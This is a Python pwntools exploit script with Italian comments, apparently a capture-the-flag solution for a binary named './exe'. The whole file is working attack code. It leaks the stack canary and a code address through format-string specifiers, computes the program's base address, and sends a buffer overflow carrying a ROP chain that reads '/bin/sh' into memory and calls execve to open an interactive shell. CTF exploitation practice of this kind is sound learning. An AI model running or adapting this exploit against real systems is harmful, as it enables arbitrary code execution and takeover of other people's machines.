```
import sys
from pwn import *

host = ''
port = 1337
binary_path = './exe'
elf = ELF(binary_path)
context.binary = elf

# Determina se eseguire localmente o meno
if len(sys.argv) > 1 and sys.argv[1] == 'local':
    local = True
else:
    local = False

# Connessione al processo
if local:
    p = elf.process()
    gdb.attach(p)
    # Se dovesse causare problemi, puoi inserire un input() o time.sleep() per attendere
else:
    p = remote(host, port)


for i in range(5):#setup peso
    p.sendline(b'3')

for i in range(6):#setup stamina
    p.sendline(b'4')

#Leak canary
p.sendline(b'6')
p.sendline(b'%9$p')#leak canary
p.recvuntil(b'Quote: "0x')

canary = int(p.recvline(), 16)
log.info(f'Canary: 0x{canary:x}')

#Leak base address
p.sendline(b'6')
p.sendline(b'%11$p')#leak a 11
p.recvuntil(b'Quote: "0x')

leak = int(p.recvline(), 16)
log.info(f'Leak: 0x{leak:x}')
base = leak - 5793
log.info(f'Base: 0x{base:x}')


syscall = 0x000000000000133e + base
rax = 0x0000000000001332 + base
rdi = 0x0000000000001336 + base
rsi = 0x000000000000133a + base
rdx = 0x0000000000001338 + base

offset_of_wr = 0x7000 #Offset of where to write
where_to_write = base + offset_of_wr

read = flat(rax , 0 ,  rdi , 0 , rsi, where_to_write , rdx , 8 , syscall) #Read in stdin(0)

rop = flat(rax , 59 ,  rdi , where_to_write , rsi, 0 ,rdx , 0 , syscall) #Rop with new /bin/sh

p.sendline(b'6')
p.sendline(b'A' * 8 + p64(canary) + b'A' * 8 + read + rop)

p.send(b'/bin/sh\0')

p.interactive()
```
